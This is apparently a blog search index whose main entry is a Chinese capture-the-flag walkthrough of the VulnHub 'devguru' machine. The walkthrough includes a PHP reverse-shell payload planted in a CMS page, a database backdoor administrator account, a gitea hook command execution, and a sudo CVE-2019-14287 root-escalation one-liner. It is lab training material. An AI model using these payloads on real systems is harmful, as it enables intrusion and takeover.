<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jarbas</title>
      <link href="/2025/05/04/jarbas/"/>
      <url>/2025/05/04/jarbas/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2025/05/04/hello-world/"/>
      <url>/2025/05/04/hello-world/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战：devguru</title>
      <link href="/2025/05/03/devguru-1/"/>
      <url>/2025/05/03/devguru-1/</url>
      
        <content type="html"><![CDATA[<p>靶场实战：devguru</p><p>靶机地址<a href="https://www.vulnhub.com/entry/devguru-1,620/">devguru</a></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>常规扫描</p><p><code>sudo nmap 192.168.1.0/24 -sn</code>靶机发现192.168.1.138</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png"></p><p><code>sudo nmap $ip -p- --min-rate=10000</code>端口扫描22,80,8585</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png"></p><p><code>sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru/detail</code>细节扫描，tcp协议扫描对应端口，-sC使用默认脚本，-SV扫描版本信息，-O确定操作系统，-oA格式化输出</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png"></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png"></p><p>80端口存在git泄露，8585端口运行了gitea</p><p><code>sudo nmap -sU --top-ports 20 $ip -oA devguru/udp</code>扫描udp的常见端口，有时可以多指定一些端口</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png" alt="enter description here"></p><p>目录扫描，有时一个工具没有收获可以多试试几个工具（如dirb，dirsearch，gobuster等）</p><p>80端口目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png"></p><p>8585端口的目录</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png" alt="enter description here"></p><h4 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h4><p>80端口存在git泄露，使用githack工具下载下来</p><p><code>sudo python GitHack.py http://192.168.1.138</code></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png"></p><p>重点查看配置相关文件</p><p>config下的database.php发现数据库信息</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png"></p><p>访问80端口的adminer.php发现是数据库管理</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png"></p><p>使用刚刚获取的信息登录</p><p>优先关注users等信息，只找到一个backend_users的表，此时有两个思路，1修改原来管理员的密码，危险程度较高，容易被发现，2是新建一个用户，危险程度较低，这里选择新建用户<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png" alt="enter description here"></p><p>最后is_superuser要设置为1，在用户组将我们新建的用户归类到管理员组</p><p>同时根据数据库加上80端口扫描的目录backend,访问并登录</p><p>登录之后在cms -add - code输入反弹shell的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStart()&#123;</span><br><span class="line">//nc监听7777端口</span><br><span class="line">    $s   =fsockopen(&quot;192.168.1.114&quot;,5555);</span><br><span class="line">    $proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png"></p><p>同时开启本地监听<code>nc -lvvp 5555</code></p><p>访问&#x2F;home1（新建网页名称）执行代码获取shell</p><p>成功拿到shell<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h5 id="获取高交互shell"><a href="#获取高交互shell" class="headerlink" title="获取高交互shell"></a>获取高交互shell</h5><p>使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获得交互更好的shell（使用什么版本的python主要看环境有什么版本）</p><p>读取&#x2F;etc&#x2F;passwd文件发现只有root和frank用户有&#x2F;bin&#x2F;bash即允许ssh且有高交互shell</p><p>1</p><p>尝试读取shadow文件权限不允许，通常shadow文件都是只有root用户有权限的，但是也不一定，如果可以读取就可以利用该文件进行hash碰撞</p><p>使用python启动一个快速http服务共享文件<code>python -m http.server</code></p><p>使用wget下载linpeas.sh和LinEnum.sh</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png"></p><p>提升权限并运行脚本</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png"></p><p>suid不存在提权，看看sudo，需要密码，无法获得</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png"></p><p>查看备份文件<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png"></p><h5 id="获取普通用户"><a href="#获取普通用户" class="headerlink" title="获取普通用户"></a>获取普通用户</h5><p>发现新的服务器连接<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png" alt="enter description here"></p><p>同样查看user，因为我们已经获取了web的权限，因此这里我们想要获取frank用户的权限，所以这里的选择是更改frank的密码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png" alt="enter description here"></p><p>原来的gitea的加密方式是pbkdf2且有salt，我们选择换一个加密方式，bcrypt，使用网站实现（我这里尝试了几种方式，只有bcrypt可行，有的博客使用了原加密方式，但没说清楚salt值的获取）<a href="https://www.bejson.com/encrypt/bcrpyt_encode/#google_vignette">在线Bcrypt密码生成工具-Bejson.com</a></p><p><code>$2a$10$sV1DF9po/5T1BE2dsy2OueGZ/VuPrUrwDR6aA88Ygu2gv6GPeGtzO</code></p><p>结合目录扫描的结构gitea在8585端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png" alt="enter description here"></p><p>左下角显示gitea的版本是1.12.5</p><p>该版本存在以下漏洞</p><p>setting -&gt; git hook输入命令</p><p>然后编辑 readme.md 随便编辑即可执行<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png" alt="enter description here"></p><p>成功拿到<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png"></p><p>存在sqlite3无需密码使用<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png" alt="enter description here"></p><h4 id="sqlite3配合sudo漏洞提权"><a href="#sqlite3配合sudo漏洞提权" class="headerlink" title="sqlite3配合sudo漏洞提权"></a>sqlite3配合sudo漏洞提权</h4><p>发现特权命令&#x2F;usr&#x2F;bin&#x2F;sqlite3使用网站查找<a href="https://gtfobins.github.io/">GTFOBins</a></p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png"></p><p>复制，执行，发现</p><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png"></p><p>sudo的版本是1.8.21，存在一个<a href="https://www.freebuf.com/vuls/217089.html">CVE-2019-14287：sudo权限绕过漏洞分析与复现 - FreeBuf网络安全行业门户</a>的漏洞</p><p>这里可以使用该漏洞配合sqlite3提权</p><p><code>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权,web渗透,vulnhub靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
